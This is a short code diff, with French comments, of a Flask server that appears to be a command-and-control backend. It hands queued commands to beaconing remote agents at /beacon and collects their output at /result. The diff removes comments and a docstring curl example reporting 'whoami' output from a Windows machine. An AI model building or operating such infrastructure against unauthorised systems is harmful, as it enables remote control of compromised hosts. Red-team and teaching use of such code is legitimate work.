@@ -112,13 +112,10 @@ def beacon():
 
     vprint(f"[BEACON] {agent_id} ({hostname}) | Commands: {len(pending_commands)}")
 
-    # IMPORTANT: L'agent C attend un format spécifique
-    # Il cherche "command" dans le JSON, pas "commands"
     if pending_commands:
-        # Pour compatibilité avec l'agent C actuel
         return jsonify({
             "status": "ok",
-            "command": pending_commands[0]["command"]  # Une seule commande pour l'instant
+            "command": pending_commands[0]["command"]
         })
     else:
         return jsonify({
@@ -137,19 +134,7 @@ def list_agents():
 
 @app.route("/result", methods=["POST"])
 def receive_result():
-    """
-    Reçoit les résultats d'exécution de commandes.
-
-    Exemple:
-    curl -X POST http://localhost:8443/result \
-      -H "Content-Type: application/json" \
-      -d '{
-        "agent_id": "TEST_C",
-        "command": "whoami",
-        "output": "WIN10\\Alice",
-        "timestamp": "2025-02-03T10:30:45"
-      }'
-    """
+    """Reçoit les résultats d'exécution de commandes."""
     data = request.get_json()
 
     agent_id = data.get("agent_id")
